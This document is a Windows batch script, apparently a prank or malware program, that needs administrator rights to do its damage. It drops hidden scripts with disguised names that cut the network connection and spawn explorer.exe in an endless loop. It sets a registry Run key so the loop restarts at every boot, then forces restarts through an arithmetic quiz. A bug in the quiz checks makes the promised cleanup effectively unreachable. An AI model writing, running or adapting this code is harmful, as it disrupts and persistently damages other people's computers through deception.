@echo off
cd C:\Users\%USERNAME%
mkdir Windows
cd C:\Users\%USERNAME%\Windows
echo set x=createobject("wscript.shell") > Windows_Event_Handler.vbs
echo X=MsgBox("Run this program on administrator mode",1+16,"heh") >> Windows_Event_Handler.vbs

net session >nul 2>&1
if %errorLevel% == 0 (
    goto inject
) else (
    start Windows_Event_Handler.vbs
    exit
)

:inject
echo ipconfig /release > Wifi-connection.cmd

echo start WinUpdater.vbs > tet.cmd
echo :packetsender >> tet.cmd
echo cd %systemroot% >> tet.cmd
echo start explorer.exe >> tet.cmd
echo goto packetsender >> tet.cmd

echo Set objShell = WScript.CreateObject("WScript.Shell") > WinUpdater.vbs
echo objShell.Run("tet.cmd"), 0, True >> WinUpdater.vbs

echo :tet > calc.cmd
echo taskkill /F /IM calculator.exe >> calc.cmd
echo goto tet >> calc.cmd

echo objShell.Run("Wifi-connection.cmd"), 0, True > calc.vbs
echo objShell.Run("calc.cmd"), 0, True >> calc.vbs

start calc.vbs
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TET-crash-module" /t REG_SZ /d "C:\Users\%USERNAME%\Windows\WinUpdater.vbs" /f

:math
set /a num1="(%RANDOM%*10/32768)+1"
set /a num2="(%RANDOM%*10/32768)+1"
set /a result="%num1% + %num2%"
set /p q="%num1% + %num2% "
if q==%result% () else (shutdown /g)

set /a num1="(%RANDOM%*1000/32768)+1"
set /a num2="(%RANDOM%*1000/32768)+1"
set /a result="%num1% + %num2%"
set /p q="%num1% + %num2% "
if q==%result% () else (shutdown /g)

set /a num1="(%RANDOM%*10000/32768)+1"
set /a num2="(%RANDOM%*10000/32768)+1"
set /a result="%num1% - %num2%"
set /p q="%num1% - %num2% "
if q==%result% () else (shutdown /g)

set /a num1="(%RANDOM%*1000/32768)+1"
set /a num2="(%RANDOM%*100/32768)+1"
set /a result="%num1% * %num2%"
set /p q="%num1% * %num2% "
if q==%result% (goto unmalicious) else (shutdown /g)

:unmalicious
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TET-crash-module"
cd C:\Users\%USERNAME%\Windows
del Wifi-connection.cmd
del tet.cmd
del WinUpdater.vbs
del calc.cmd
rmdir C:\Users\%USERNAME%\Windows
shutdown /r